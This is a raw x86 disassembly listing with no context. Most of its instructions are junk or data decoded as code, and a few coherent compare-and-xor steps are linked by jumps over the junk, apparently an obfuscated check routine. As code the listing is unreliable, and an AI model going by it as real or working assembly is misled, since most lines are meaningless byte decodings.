  404153:	ret    0x2dbd
  404156:	stc    
  404157:	fst    DWORD PTR [ebx]
  404159:	or     dl,BYTE PTR [edi]
  40415b:	xor    DWORD PTR [esi-0x4b],ebp
  40415e:	or     DWORD PTR [edi-0x3c04303e],esp
  404164:	daa    
  404165:	fistp  DWORD PTR [edx]
  404167:	dec    edx
  404168:	inc    edi
  404169:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40416a:	nop
  40416b:	dec    esi
  40416c:	jo     0x404184
  40416e:	shl    DWORD PTR [ebx+0x7f],cl
  404171:	enter  0x9144,0xc0
  404175:	mov    ds,WORD PTR [ebx]
  404177:	inc    eax
  404178:	add    BYTE PTR [edi*4+0x16a8baa7],bl
  40417f:	sti    
  404180:	mov    al,BYTE PTR [esi+ebx*2+0xe]
  404184:	mov    ebp,0x92bdaf37
  404189:	xor    cl,BYTE PTR [ecx-0xb]
  40418c:	dec    edi
  40418d:	jnp    0x40417f
  40418f:	cmp    DWORD PTR [esi+0x128ae601],ecx
  404195:	sbb    ah,dh
  404197:	or     ebp,DWORD PTR [ebx-0x3c25e03b]
  40419d:	hlt    
  40419e:	jmp    0x4b87dfa4
  4041a3:	sar    BYTE PTR [ecx-0x2ac27f49],0xac
  4041aa:	jmp    0x1200:0xb154fb32
  4041b1:	pop    es
  4041b2:	adc    eax,ebx
  4041b4:	(bad)  
  4041b6:	clc    
  4041b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041b8:	dec    BYTE PTR [edx+0x6c]
  4041bb:	adc    al,0xd
  4041bd:	cdq    
  4041be:	cmp    ecx,esi
  4041c0:	outs   dx,BYTE PTR ds:[esi]
  4041c1:	xchg   DWORD PTR [edx],edi
  4041c3:	or     al,0x32
  4041c5:	out    dx,al
  4041c6:	shr    ebp,1
  4041c8:	scas   eax,DWORD PTR es:[edi]
  4041c9:	xchg   DWORD PTR [eax],esi
  4041cb:	dec    ebx
  4041cc:	pop    edx
  4041cd:	push   0xfffffff8
  4041cf:	add    eax,0x653970bf
  4041d4:	push   edi
  4041d5:	js     0x40421e
  4041d7:	cmp    eax,0x728ff804
  4041dc:	bound  esi,QWORD PTR [edi+0x34212d74]
  4041e2:	xlat   BYTE PTR ds:[ebx]
  4041e3:	psubusb mm2,QWORD PTR [ebx]
  4041e6:	ret    0xa05b
  4041e9:	inc    eax
  4041ea:	mov    ch,0xcc
  4041ec:	ins    BYTE PTR es:[edi],dx
  4041ed:	cmp    eax,0xf478ba0b
  4041f2:	fld1   
  4041f4:	or     eax,0x60fe01aa
  4041f9:	mov    dh,0xa4
  4041fb:	mov    ch,0x2e
  4041fd:	mov    dh,0x99
  4041ff:	and    edi,ebx
  404201:	dec    edi
  404202:	add    eax,esi
  404204:	(bad)  
  404205:	xor    bl,bh
  404207:	(bad)  
  404209:	sub    DWORD PTR [ecx],ebx
  40420b:	in     al,0x7
  40420d:	mov    WORD PTR [edi+0x4b26c9c0],es
  404213:	clc    
  404214:	xchg   edi,eax
  404215:	aas    
  404216:	or     bh,BYTE PTR [edi+0x730088d1]
  40421c:	fimul  DWORD PTR [esi+eax*8+0x33f03c7a]
  404223:	rol    DWORD PTR [ebx],0xc6
  404226:	mov    DWORD PTR [edx],eax
  404228:	mov    eax,DWORD PTR [ebp-0x8]
  40422b:	xor    eax,ecx
  40422d:	add    eax,esi
  40422f:	jmp    0x404374
  404234:	ffree  st(0)
  404236:	adc    BYTE PTR [ecx+esi*4-0x168e12ae],0xf2
  40423e:	mov    esi,0x7e278d35
  404243:	aaa    
  404244:	xor    al,0x18
  404246:	jo     0x4042b8
  404248:	sbb    BYTE PTR [edi+0x70],bh
  40424b:	jo     0x404277
  40424d:	cld    
  40424e:	add    edx,DWORD PTR [ecx+0x62b80724]
  404254:	cs jns 0x404277
  404257:	xor    eax,0x4a5df891
  40425c:	icebp  
  40425d:	or     eax,0x44af45bc
  404262:	pusha  
  404263:	push   esi
  404264:	fld    QWORD PTR [ecx]
  404266:	mov    ch,0x33
  404268:	rcr    eax,cl
  40426a:	sbb    eax,0xdc383480
  40426f:	stos   DWORD PTR es:[edi],eax
  404270:	pop    ss
  404271:	ins    BYTE PTR es:[edi],dx
  404272:	in     eax,0x7e
  404274:	add    ebx,DWORD PTR [edi]
  404276:	call   FWORD PTR [eax]
  404278:	push   ds
  404279:	pop    es
  40427a:	fild   DWORD PTR [eax-0x1]
  40427d:	cld    
  40427e:	or     al,0xb2
  404280:	jbe    0x40426a
  404282:	into   
  404283:	jnp    0x404283
  404285:	loope  0x404257
  404287:	gs (bad) 
  404289:	mov    bl,0x95
  40428b:	push   eax
  40428c:	pop    ecx
  40428d:	aas    
  40428e:	dec    BYTE PTR [esi-0x16]
  404291:	cmp    ah,BYTE PTR [edi-0x31d77855]
  404297:	jb     0x404222
  404299:	inc    DWORD PTR [ecx-0x74]
  40429c:	pcmpgtw mm1,QWORD PTR [eax-0x71]
  4042a0:	push   0x8122debe
  4042a5:	es ins BYTE PTR es:[edi],dx
  4042a7:	mul    esi
  4042a9:	adc    edi,DWORD PTR [edi]
  4042ab:	pop    ebx
  4042ac:	xor    eax,0x836c660b
  4042b1:	out    0x20,eax
  4042b3:	jg     0x4042ff
  4042b5:	loop   0x4042ea
  4042b7:	popf   
  4042b8:	pop    ebp
  4042b9:	xchg   BYTE PTR [ebx],ch
  4042bb:	xchg   ecx,eax
  4042bc:	xor    bl,bl
  4042be:	stos   DWORD PTR es:[edi],eax
  4042bf:	jl     0x4042b3
  4042c1:	and    eax,0xd06d2383
  4042c6:	dec    ebx
  4042c7:	mov    bl,0x1e
  4042c9:	imul   esp,ebx,0x328f14e4
  4042cf:	mov    bh,0xa1
  4042d1:	shl    DWORD PTR [ecx+0x7b],cl
  4042d4:	mov    edx,edx
  4042d6:	in     al,0xad
  4042d8:	jns    0x404355
  4042da:	pop    esi
  4042db:	push   ss
  4042dc:	bound  ebp,QWORD PTR [edi+0xe]
  4042df:	out    0x7f,al
  4042e1:	dec    esp
  4042e2:	adc    eax,0x4c6d5e61
  4042e7:	cmp    DWORD PTR [edx],edx
  4042e9:	sub    ebx,DWORD PTR [ebx+0x5b8252bb]
  4042ef:	lock sub al,0x7
  4042f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042f3:	hlt    
  4042f4:	inc    edx
  4042f5:	push   es
  4042f6:	enter  0x7cea,0x2f
  4042fa:	mov    ch,0xef
  4042fc:	push   0xffffffd2
  4042fe:	or     esi,DWORD PTR [esi-0x5f]
  404301:	retf   0xf528
  404304:	call   DWORD PTR ds:0x22a04ea3
  40430a:	cdq    
  40430b:	into   
  40430c:	aas    
  40430d:	mov    esi,0x83ce2a2d
  404312:	and    al,0xcd
  404314:	fldcw  WORD PTR [ebx+ecx*2-0x1e]
  404318:	fwait
  404319:	adc    BYTE PTR [ebx-0x4a],ch
  40431c:	xchg   esi,eax
  40431d:	inc    ebx
  40431e:	push   0xffffffd6
  404320:	popa   
  404321:	retf   
  404322:	aas    
  404323:	(bad)  
  404324:	aam    0x26
  404326:	xor    BYTE PTR [edx],bh
  404328:	or     esp,DWORD PTR [esi]
  40432a:	cld    
  40432b:	pop    eax
  40432c:	cmp    al,0x7a
  40432e:	add    al,0xa2
  404330:	pop    ss
  404331:	mov    cl,BYTE PTR [ebx-0x2c]
  404334:	js     0x404370
  404336:	call   0xd85:0x465ba93
  40433d:	sbb    bh,BYTE PTR ds:0xb792ef63
  404343:	aas    
  404344:	call   0x8d10:0x73b3d94e
  40434b:	xor    BYTE PTR [ebp+eiz*1-0x40b18566],ah
  404352:	add    BYTE PTR [esi+esi*4-0x77],dl
  404356:	cld    
  404357:	shr    DWORD PTR [ecx-0x42ada9dd],1
  40435d:	scas   eax,DWORD PTR es:[edi]
  40435e:	into   
  40435f:	test   BYTE PTR [esi],0x77
  404362:	add    ebp,edx
  404364:	add    bl,BYTE PTR [ebp+0x47a14cec]
  40436a:	ins    DWORD PTR es:[edi],dx
  40436b:	bound  edi,QWORD PTR ds:0x711087c1
  404371:	xchg   ecx,eax
  404372:	adc    al,0x3
  404374:	mov    DWORD PTR [ebp+0x8],eax
  404377:	mov    eax,DWORD PTR [ebp+0x8]
  40437a:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  40437e:	mov    dl,BYTE PTR [ebp-0x1]
  404381:	cmp    al,dl
  404383:	je     0x4048da
  404389:	mov    eax,DWORD PTR [ebp+0x8]
  40438c:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  404390:	jmp    0x4044d5
  404395:	scas   al,BYTE PTR es:[edi]
  404396:	or     al,0x38
  404398:	repz (bad) 
  40439b:	test   eax,0x35388951
  4043a0:	rcl    DWORD PTR [ebp+0x28],cl
  4043a3:	cmp    DWORD PTR [esi+0x707027dc],esi
  4043a9:	sbb    BYTE PTR [edi+0x70],bh
  4043ac:	jo     0x4043cb
  4043ae:	dec    esp
  4043af:	jl     0x40435b
  4043b1:	iret   
  4043b2:	jo     0x4043b7
  4043b4:	nop
  4043b5:	(bad)  
  4043b6:	lea    esi,[ecx]
  4043b8:	cli    
  4043b9:	fisubr WORD PTR [ecx]
  4043bb:	int3   
  4043bc:	test   al,0x81
  4043be:	xor    al,0x29
  4043c0:	fnstsw WORD PTR [ebx+0x2]
  4043c3:	repnz inc ecx
  4043c5:	out    0x6a,al
  4043c7:	mov    bl,0x3e
  4043c9:	pop    ebp
  4043ca:	imul   eax,DWORD PTR [esi-0x78],0xed28624
  4043d1:	fcom   DWORD PTR [eax+0x706d410d]
  4043d7:	retf   
  4043d8:	fdecstp 
  4043da:	adc    DWORD PTR [edi-0x126c71dd],0xffffffdb
  4043e1:	pop    es
  4043e2:	mov    cl,BYTE PTR [ecx+0x2b]
  4043e5:	xchg   BYTE PTR [edi],dl
  4043e7:	out    0xe8,eax
  4043e9:	sub    BYTE PTR [ebp-0x46],ch
  4043ec:	xor    al,0x3f
  4043ee:	xchg   ebx,eax
  4043ef:	jmp    0x404399
  4043f1:	inc    ebp
  4043f2:	retf   
  4043f3:	sti    
  4043f4:	shl    DWORD PTR [eax-0x1b1a4d39],cl
  4043fa:	lods   al,BYTE PTR ds:[esi]
  4043fb:	pushf  
  4043fc:	mov    ah,0xcf
  4043fe:	mov    bl,0x95
  404400:	out    dx,eax
  404401:	xchg   DWORD PTR [edx],ebp
  404403:	xor    BYTE PTR [edx-0x366d0250],cl
  404409:	sub    eax,0x2e1c100f
  40440e:	mov    ebp,eax
  404410:	jbe    0x4043f1
  404412:	jno    0x4043e9
  404414:	test   ah,bl
  404416:	in     eax,dx
  404417:	jmp    0x404432
  404419:	mov    esi,DWORD PTR [eax+eiz*1]
  40441c:	push   esp
  40441d:	push   0x59b06330
  404422:	popa   
  404423:	fcom   QWORD PTR ds:0xada9a75d
  404429:	or     DWORD PTR [edx+0x40],eax
  40442c:	jecxz  0x4043df
  40442e:	imul   ebx,DWORD PTR [esi+0x5f2d1c4],0x9dd035a9
  404438:	popa   
  404439:	xchg   edx,eax
  40443a:	outs   dx,BYTE PTR ds:[esi]
  40443b:	xor    BYTE PTR [ebx+0xf],0x19
  40443f:	cmp    bl,BYTE PTR [esi-0x478ef9a6]
  404445:	xchg   ebp,eax
  404446:	(bad)  
  404447:	retf   0x1590
  40444a:	in     al,dx
  40444b:	pusha  
  40444c:	and    al,0x8b
  40444e:	int    0xae
  404450:	out    0x89,al
  404452:	cmp    esp,ebx
  404454:	or     al,0xa8
  404456:	call   0xa639:0x65fc914c
  40445d:	sti    
  40445e:	js     0x404495
  404460:	out    dx,eax
  404461:	xor    eax,0x5d0615c6
  404466:	or     DWORD PTR [esi+0x3f],0xffffffdd
  40446a:	int    0xb2
  40446c:	mov    eax,ds:0x7ef0e57a
  404471:	repz mov eax,0x9211c75a
  404477:	xchg   edx,eax
  404478:	cmc    
  404479:	sbb    bh,cl
  40447b:	adc    ch,BYTE PTR [esi-0x227eb613]
  404481:	adc    eax,0x62b79e8f
  404486:	push   ebp
  404487:	or     dl,bl
  404489:	xchg   ch,bl
  40448b:	cmp    BYTE PTR [ebx],cl
  40448d:	jmp    0xc1ea:0x410569f5
  404494:	inc    esi
  404495:	xchg   DWORD PTR [ebp+eax*8-0x38016a24],ebx
  40449c:	mov    al,ds:0x64b4e1d7
  4044a1:	imul   esp,ebp,0xed293034
  4044a7:	adc    esi,eax
  4044a9:	pop    ebp
  4044aa:	fimul  DWORD PTR [esi+0x7c5584a1]
  4044b0:	and    al,0xe1
  4044b2:	mov    DWORD PTR [ebp-0x66],ebx
  4044b5:	ficom  WORD PTR [edx+eiz*8-0x5f5ccf10]
  4044bc:	addr16 dec edi
  4044be:	mov    ebp,DWORD PTR [edx+0x3bee2b53]
  4044c4:	fstp   DWORD PTR [edi-0x8a82389]
  4044ca:	dec    ecx
  4044cb:	xor    BYTE PTR ds:0x8e40393d,0x8
  4044d2:	icebp  
  4044d3:	loopne 0x404549
  4044d5:	mov    edx,DWORD PTR [ebp+0xc]
  4044d8:	cmp    al,BYTE PTR [edx]
  4044da:	jne    0x404ccf
  4044e0:	mov    eax,DWORD PTR [ebp-0x8]
  4044e3:	jmp    0x404628
  4044e8:	dec    edi
  4044e9:	push   edx
  4044ea:	test   ebx,esi
  4044ec:	xor    ebx,0x16807269
  4044f2:	popa   
  4044f3:	jns    0x4044fb
  4044f5:	pop    ds
  4044f6:	inc    esp
  4044f7:	inc    edi
  4044f8:	test   BYTE PTR [esi],ah
  4044fa:	jo     0x40456c
  4044fc:	sbb    BYTE PTR [edi+0x70],bh
  4044ff:	jo     0x4044f9
  404501:	sbb    al,0x4c
  404503:	mov    edi,0xc7c26a7f
  404508:	dec    esp
  404509:	test   DWORD PTR [ebp+0x61a31318],esi
  40450f:	bound  ebp,QWORD PTR [eax-0x5ed6d887]
  404515:	mov    ds:0x2c43f3bc,eax
  40451a:	sub    BYTE PTR [eax],0x12
  40451d:	sbb    al,0xba
  40451f:	pop    ecx
  404520:	mov    es,WORD PTR [ecx]
  404522:	(bad)  
  404523:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404524:	aad    0xec
  404526:	adc    DWORD PTR ds:[ebx+0x1c5c0964],ebx
  40452d:	nop
  40452e:	lods   eax,DWORD PTR ds:[esi]
  40452f:	arpl   WORD PTR [edx+ebx*4+0x75],bx
  404533:	lea    eax,[ecx+0x2d82ebb]
  404539:	or     eax,0xb74b099
  40453e:	xchg   esi,eax
  40453f:	iret   
  404540:	adc    esp,esp
  404542:	jbe    0x4044e2
  404544:	push   edi
  404545:	mov    bh,0x48
  404547:	mov    ebx,ebx
  404549:	mov    edx,0x122def5a
  40454e:	into   
  40454f:	cs iret 
  404551:	jle    0x4045c6
  404553:	jg     0x4044d9
  404555:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404556:	xchg   edx,ebp
  404558:	repnz out 0x47,al
  40455b:	cmc    
  40455c:	out    dx,eax
  40455d:	dec    esp
  40455e:	jle    0x4045d5
  404560:	push   ds
  404561:	stos   BYTE PTR es:[edi],al
  404562:	sub    eax,0xecc830cf
  404567:	inc    ebp
  404568:	lods   eax,DWORD PTR ds:[esi]
  404569:	lea    edx,[ebx]
  40456b:	sbb    DWORD PTR [ebp-0x666deae],ebp
  404571:	je     0x404564
  404573:	fnstcw WORD PTR [eax-0x3f2326ac]
  404579:	outs   dx,DWORD PTR ds:[esi]
  40457a:	sub    ah,BYTE PTR [ebp+0x5c]
  40457d:	(bad)  
  40457e:	lds    edi,FWORD PTR ds:0x4298d8a
  404584:	inc    esi
  404585:	sbb    eax,0x4b0542de
  40458a:	cmp    DWORD PTR ds:0xb6ffee26,0xffffffaa
  404591:	cmp    DWORD PTR ds:0x3e6febe7,ebp
  404597:	mov    esp,DWORD PTR [edx-0x71]
  40459a:	adc    BYTE PTR ds:0xfb3f8187,al
  4045a0:	cmp    cl,ch
  4045a2:	pushf  
  4045a3:	(bad)  
  4045a4:	fld    TBYTE PTR [esi]
  4045a6:	push   edx
  4045a7:	cdq    
  4045a8:	rcr    DWORD PTR [ebp-0xb],0xe4
  4045ac:	ins    DWORD PTR es:[edi],dx
  4045ad:	bound  edi,QWORD PTR es:[edi-0x12]
  4045b1:	leave  
  4045b2:	ins    BYTE PTR es:[edi],dx
  4045b3:	xor    eax,0xe2f45135
  4045b8:	lds    edx,FWORD PTR [eax-0x64e8d95a]
  4045be:	pop    esi
  4045bf:	in     eax,dx
  4045c0:	je     0x40461d
  4045c2:	arpl   WORD PTR [edi+0x24],cx
  4045c5:	mov    edi,0x3de5d2ff
  4045ca:	mov    esi,0xe85d303e
  4045cf:	jnp    0x404552
  4045d1:	hlt    
  4045d2:	or     al,0xe6
  4045d4:	fst    st(0)
  4045d6:	ret    0x2eb2
  4045d9:	fisttp QWORD PTR [edi-0x3]
  4045dc:	iret   
  4045dd:	rcl    DWORD PTR [eax-0x66],1
  4045e0:	and    BYTE PTR [ebx],cl
  4045e2:	mov    esi,0x1f15f1c7
  4045e7:	jg     0x4045da
  4045e9:	mov    cl,0xa7
  4045eb:	ja     0x404656
  4045ed:	mov    esi,0x8811f8fe
  4045f2:	mov    edx,0x7f55f774
  4045f7:	in     al,dx
  4045f8:	popf   
  4045f9:	shl    eax,1
  4045fb:	fwait
  4045fc:	push   0x2eae7589
  404601:	fmul   QWORD PTR [eax+0x34]
  404604:	or     al,0xa7
  404606:	sar    BYTE PTR [edi+edi*1-0x5e],0xa
  40460b:	stos   BYTE PTR es:[edi],al
  40460c:	pop    eax
  40460d:	sbb    BYTE PTR [ecx+0x13e9baa9],dl
  404613:	push   edx
  404614:	test   BYTE PTR [esp+ebx*2+0x61ebafa0],cl
  40461b:	fs clc 
  40461d:	iret   
  40461e:	bound  edi,QWORD PTR [ebp+0x7c6bbe5a]
  404624:	cld    
  404625:	dec    esp
  404626:	test   ch,dl
  404628:	mov    edx,DWORD PTR [ebp+0xc]
  40462b:	movsx  edx,BYTE PTR [edx]
  40462e:	xor    eax,ecx
  404630:	add    eax,esi
  404632:	cmp    edx,eax
  404634:	jmp    0x404779
  404639:	mov    edi,0x915e91cc
  40463e:	gs jae 0x40462a
  404641:	nop
  404642:	sbb    eax,0xe0616c86
  404647:	dec    ecx
  404648:	jb     0x4045f6
  40464a:	and    eax,0x7f187070
  40464f:	jo     0x4046c1
  404651:	lahf   
  404652:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404653:	push   esi
  404654:	stc    
  404655:	jecxz  0x404615
  404657:	stc    
  404658:	jne    0x404641
  40465a:	sbb    al,0x97
  40465c:	es xor eax,0xdddb9318
  404662:	jge    0x404623
  404664:	and    DWORD PTR [ecx+0x72],esi
  404667:	or     BYTE PTR [ebp+0x5f],cl
  40466a:	pop    edx
  40466b:	dec    edx
  40466c:	pop    esp
  40466d:	add    esp,DWORD PTR [ebx-0x1a64f09f]
  404673:	fwait
  404674:	xor    al,0x7e
  404676:	adc    BYTE PTR [edi+0x2a],dh
  404679:	call   FWORD PTR [esi+0x20]
  40467c:	or     ch,ah
  40467e:	xchg   edx,eax
  40467f:	inc    esp
  404680:	jmp    DWORD PTR [ecx+0x547288fc]
  404686:	add    BYTE PTR [edi+0x28c85079],dh
  40468c:	repnz xchg ebp,eax
  40468e:	arpl   WORD PTR [ecx],ax
  404690:	std    
  404691:	js     0x404657
  404693:	ins    DWORD PTR es:[edi],dx
  404694:	xlat   BYTE PTR ds:[ebx]
  404695:	cmp    al,0xf3
  404697:	mov    cl,0xfb
  404699:	or     eax,0x7a06d49d
  40469e:	sub    ecx,DWORD PTR [eax-0x55]
  4046a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4046a2:	in     eax,0x8c
  4046a4:	into   
  4046a5:	push   edx
  4046a6:	repz dec edi
  4046a8:	push   edi
  4046a9:	into   
  4046aa:	mov    ecx,0x7513aa97
  4046af:	cmp    DWORD PTR [ebp+0x71],edi
  4046b2:	or     edi,edx
  4046b4:	icebp  
  4046b5:	es sub eax,0xdd2dd9da
  4046bb:	nop
  4046bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4046bd:	rcr    BYTE PTR [eax+ebx*8-0x1d178c72],cl
  4046c4:	push   0x30356443
  4046c9:	pop    ebp
  4046ca:	call   DWORD PTR [edx]
  4046cc:	(bad)  
  4046cd:	mov    edx,0x2710a3c9
  4046d2:	sbb    DWORD PTR [ebp-0x730ff56],esp
  4046d8:	mov    bl,0xca
  4046da:	and    cl,ch
  4046dc:	xchg   ecx,eax
  4046dd:	in     al,0xc0
  4046df:	mov    esp,0x6e824955
  4046e4:	lods   al,BYTE PTR ds:[esi]
  4046e5:	gs retf 0x3542
  4046e9:	add    DWORD PTR [edi-0x33420658],ebx
  4046ef:	clc    
  4046f0:	bound  esi,QWORD PTR [ecx]
  4046f2:	xchg   esp,eax
  4046f3:	pop    ecx
  4046f4:	sbb    edi,DWORD PTR [esi]
  4046f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4046f7:	aaa    
  4046f8:	lods   al,BYTE PTR ds:[esi]
  4046f9:	(bad)  
  4046fa:	push   ss
  4046fb:	int3   
  4046fc:	mov    edi,0x1ffa7487
  404701:	push   0x7caa4676
  404706:	mov    BYTE PTR [ebp+ecx*8+0x6a],ch
  40470a:	sar    DWORD PTR [edx],1
  40470c:	push   esp
  40470d:	mov    bh,0xb6
  40470f:	inc    ebx
  404710:	or     DWORD PTR [ebx-0x28],0xf0184d04
  404717:	mov    edx,0x8f7837b6
  40471c:	stos   BYTE PTR es:[edi],al
  40471d:	neg    BYTE PTR [ecx-0x58]
  404720:	stc    
  404721:	shr    DWORD PTR [edx-0x7f],cl
  404724:	push   ebp
  404725:	shl    DWORD PTR [ecx],0xec
  404728:	adc    eax,0xd5631728
  40472d:	dec    ax
  40472f:	aaa    
  404730:	cmp    al,BYTE PTR [ecx+edi*8]
  404733:	and    DWORD PTR [esi-0x33],esp
  404736:	fstp   DWORD PTR [ecx-0x32e8c163]
  40473c:	pushf  
  40473d:	jns    0x404709
  40473f:	sub    eax,0xa187063b
  404744:	add    BYTE PTR [edx-0x7d],bh
  404747:	out    0xd0,al
  404749:	loope  0x40471f
  40474b:	dec    eax
  40474c:	xchg   BYTE PTR [ebx+ecx*1-0x29],dh
  404750:	fist   DWORD PTR [eax-0x35]
  404753:	int    0x28
  404755:	dec    edx
  404756:	mov    ebx,0x490da300
  40475b:	(bad)  
  40475c:	mov    ds:0x1fe96bdd,eax
  404761:	or     dh,bl
  404763:	jl     0x40476e
  404765:	lahf   
  404766:	in     al,dx
  404767:	sbb    ch,BYTE PTR [edi-0x5b]
  40476a:	lods   al,BYTE PTR ds:[esi]
  40476b:	inc    ebx
  40476c:	mov    ebp,0x66babeec
  404771:	or     al,0xb0
  404773:	test   DWORD PTR [edx-0x5a8fcc2e],esi
  404779:	je     0x404b7e
  40477f:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  404786:	jmp    0x4048cb
  40478b:	aaa    
  40478c:	dec    ebp
  40478d:	rcr    DWORD PTR [edi],cl
  40478f:	jno    0x404732
  404791:	repz push ebp
  404793:	enter  0x209d,0xec
  404797:	test   DWORD PTR [edi+ecx*1-0xd],eax
  40479b:	push   esp
  40479c:	and    al,0x70
  40479e:	jo     0x4047b8
  4047a0:	jg     0x404812
  4047a2:	jo     0x40475e
  4047a4:	mov    al,ds:0x9820f67e
  4047a9:	cmp    eax,0xccb74b4e
  4047ae:	add    ebp,DWORD PTR [edx-0x43ba67a4]
  4047b4:	sub    BYTE PTR [edi],al
  4047b6:	cs dec esp
  4047b8:	xchg   esi,eax
  4047b9:	test   BYTE PTR [ecx-0x50],dh
  4047bc:	lock sbb eax,0x8e385e47
  4047c2:	push   esi
  4047c3:	mov    bl,0x71
  4047c5:	xchg   ebp,esp
  4047c7:	stos   BYTE PTR es:[edi],al
  4047c8:	cmp    ch,BYTE PTR [esp+esi*1]
  4047cb:	jle    0x40476b
  4047cd:	cmp    DWORD PTR [ebp-0x458a4e5b],edx
  4047d3:	icebp  
  4047d4:	add    DWORD PTR [eax-0x6a13397],ebp
  4047da:	adc    DWORD PTR [ebp-0x733e9f0a],edi
  4047e0:	cdq    
  4047e1:	mov    al,ds:0x300f14e6
  4047e6:	sbb    eax,edx
  4047e8:	or     bh,ch
  4047ea:	out    dx,al
  4047eb:	pop    ds
  4047ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4047ed:	mov    esi,DWORD PTR [edi+0x21647308]
  4047f3:	(bad)  
  4047f6:	mov    ds:0x56c43594,al
  4047fb:	xchg   esi,eax
  4047fc:	es stc 
  4047fe:	and    dh,cl
  404800:	rcr    DWORD PTR [ebp-0x24],cl
  404803:	rol    DWORD PTR [edx],0x55
  404806:	mov    bl,0x86
  404808:	jecxz  0x404844
  40480a:	sbb    al,0x64
  40480c:	dec    ecx
  40480d:	scas   eax,DWORD PTR es:[edi]
  40480e:	mul    bl
  404810:	and    ch,BYTE PTR [eax-0x17]
  404813:	cdq    
  404814:	jnp    0x4047bf
  404816:	sub    DWORD PTR [edx+0x34e754a6],esp
  40481c:	xchg   DWORD PTR [edx-0x20],esp
  40481f:	dec    eax
  404820:	lds    edx,FWORD PTR [ebp-0x34]
  404823:	sbb    al,0x3c
  404825:	pop    esp
  404826:	leave  
  404827:	lock (bad) 
  404829:	sbb    DWORD PTR [edi+ecx*4-0x4b],eax
  40482d:	loope  0x404873
  40482f:	imul   edx,DWORD PTR [esi],0xffffffd0
  404832:	mov    ds:0xea49a36,al
  404837:	(bad)  
  404838:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404839:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40483a:	push   ebx
  40483b:	aad    0xf1
  40483d:	idiv   esp
  40483f:	loope  0x40485c
  404841:	sub    bh,BYTE PTR [eax-0x2f9098dd]
  404847:	repz inc ebp
  404849:	jne    0x40482f
  40484b:	lahf   
  40484c:	or     DWORD PTR [edi+0x5240143a],0x5b
  404853:	and    ah,ah
  404855:	sub    eax,0x18a107ab
  40485a:	and    al,0xf1
  40485c:	idiv   BYTE PTR [esi-0x4c]
  40485f:	repz fmul st(3),st
  404862:	test   DWORD PTR [ebx-0x1d],esp
  404865:	ror    BYTE PTR [esi+0x2d],1
  404868:	cmp    esi,DWORD PTR ds:0xe27455b5
  40486e:	popf   
  40486f:	push   edx
  404870:	(bad)  
  404871:	fist   DWORD PTR [esp+ecx*2+0x2615cdd0]
  404878:	mov    dl,0x63
  40487a:	stos   BYTE PTR es:[edi],al
  40487b:	mov    dl,0xbf
  40487d:	pop    edx
  40487e:	cmp    eax,0x774281d7
  404883:	lahf   
  404884:	push   cs
  404885:	mov    BYTE PTR [edx+edi*1-0x1d],bh
  404889:	mov    al,0xbf
  40488b:	pop    ebx
  40488c:	dec    edx
  40488d:	ror    al,0x80
  404890:	sar    BYTE PTR [ebx-0x600580d8],1
  404896:	pop    esi
  404897:	xchg   BYTE PTR [eax+ecx*2-0xf],al
  40489b:	or     DWORD PTR [eax+0x415f4fa9],0xc
  4048a2:	scas   al,BYTE PTR es:[edi]
  4048a3:	lods   eax,DWORD PTR ds:[esi]
  4048a4:	or     DWORD PTR [edi*4+0x22d84b87],esp
  4048ab:	outs   dx,BYTE PTR ds:[esi]
  4048ac:	add    ah,ch
  4048ae:	jns    0x4048a1
  4048b0:	push   edx
  4048b1:	mov    ch,0xf
  4048b3:	cmp    BYTE PTR [ebx+0x6],dh
  4048b6:	mov    al,0x68
  4048b8:	mov    ecx,0x79d24364
  4048bd:	loopne 0x4048ef
  4048bf:	push   ebx
  4048c0:	xchg   esp,ebx
  4048c2:	and    edi,esp
  4048c4:	je     0x40492b
  4048c6:	addr16 aam 0x59
  4048c9:	shl    ch,cl
  4048cb:	lea    eax,[ebp-0x18]
  4048ce:	mov    DWORD PTR [ebp-0x14],eax
  4048d1:	mov    eax,DWORD PTR [ebp-0x14]
  4048d4:	add    DWORD PTR [eax],0x705fa8f
  4048da:	mov    eax,DWORD PTR [ebp-0x10]
  4048dd:	mov    edx,DWORD PTR [ebp+0x8]
  4048e0:	xor    eax,ecx
  4048e2:	lea    eax,[eax+edx*1+0x32729c]
  4048e9:	mov    DWORD PTR [ebp+0x8],eax
  4048ec:	jmp    0x404a31
  4048f1:	mov    cl,BYTE PTR [eax]
  4048f3:	add    DWORD PTR [eax+0x12918b81],0xffffff82
  4048fa:	jecxz  0x404905
  4048fc:	or     eax,0xccc81013
  404901:	jl     0x404925
  404903:	jo     0x404975
  404905:	sbb    BYTE PTR [edi+0x70],bh
  404908:	jo     0x40489b
  40490a:	mov    ah,0x1d
  40490c:	jno    0x40490c
  40490e:	(bad)  
  40490f:	out    0xa1,eax
  404911:	pop    eax
  404912:	inc    eax
  404913:	inc    edx
  404914:	ret    0x4a9d
  404917:	jg     0x40494c
  404919:	push   0xa0f87bf9
  40491e:	mov    al,0xf
  404920:	out    dx,eax
  404921:	icebp  
  404922:	test   al,0xe7
  404924:	sub    eax,0x82bb0409
  404929:	pop    ebp
  40492a:	cld    
  40492b:	out    0x6a,eax
  40492d:	(bad)  
  40492e:	std    
  40492f:	test   eax,0xb31e0242
  404934:	or     DWORD PTR [eax-0x6e],ecx
  404937:	mov    ah,0xd1
  404939:	push   cs
  40493a:	inc    edi
  40493b:	or     eax,0x4220c378
  404940:	mov    ebx,0xcd2edad1
  404945:	out    0xe1,al
  404947:	gs (bad) 
  404949:	nop
  40494a:	cs leave 
  40494c:	mov    bh,0x16
  40494e:	iret   
  40494f:	cmc    
  404950:	ds and eax,0x2a462582
  404956:	xlat   BYTE PTR ds:[ebx]
  404957:	push   0x58
  404959:	jmp    0x8115:0xe71f6af8
  404960:	inc    esp
